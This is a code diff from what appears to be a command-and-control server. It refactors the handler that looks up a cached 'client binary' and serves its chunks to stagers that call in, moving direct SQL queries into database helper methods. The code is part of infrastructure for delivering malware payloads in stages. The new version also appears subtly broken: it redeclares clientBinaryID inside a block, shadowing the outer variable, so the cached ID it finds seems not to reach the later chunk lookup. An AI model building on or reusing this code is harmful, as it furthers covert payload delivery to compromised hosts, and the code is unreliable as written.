@@ -1603,32 +1603,23 @@ func (c2 *C2Manager) handleStagerChunkRequestNew(chunkIndex int, stagerIP string
 			logf("[C2] ⚠️  Session %s not in local cache, searching for cached chunks", sessionID)
 		}
 
-		// Query for any cached chunks - typically we'll have exactly one binary cached
-		var foundBinaryID string
-		err := c2.db.db.QueryRow(`
-			SELECT DISTINCT client_binary_id FROM stager_chunk_cache LIMIT 1
-		`).Scan(&foundBinaryID)
-
-		if err == nil && foundBinaryID != "" {
-			clientBinaryID = foundBinaryID
+		// Use database method with proper mutex handling
+		clientBinaryID, err := c2.db.GetCachedBinaryID()
+		if err != nil {
 			if !isDuplicate {
-				logf("[C2] Found cached binary: %s (will serve from this)", clientBinaryID)
-			}
-		} else {
-			if !isDuplicate {
-				logf("[C2] ❌ No cached chunks available!")
+				logf("[C2] ❌ No cached chunks available: %v", err)
 			}
 			return "ERROR|NO_CACHE"
+		}
+
+		if !isDuplicate {
+			logf("[C2] Found cached binary: %s (will serve from this)", clientBinaryID)
 		}
 	}
 
 	// Now serve the chunk from cache (fast - no Master query!)
-	var chunkData string
-	err := c2.db.db.QueryRow(`
-		SELECT chunk_data FROM stager_chunk_cache 
-		WHERE client_binary_id = ? AND chunk_index = ?
-	`, clientBinaryID, chunkIndex).Scan(&chunkData)
-
+	// Use proper database method instead of direct db access
+	chunkData, err := c2.db.GetCachedChunkByBinaryID(clientBinaryID, chunkIndex)
 	if err != nil {
 		if !isDuplicate {
 			logf("[C2] ❌ Chunk %d not in cache for binary %s: %v", chunkIndex, clientBinaryID, err)
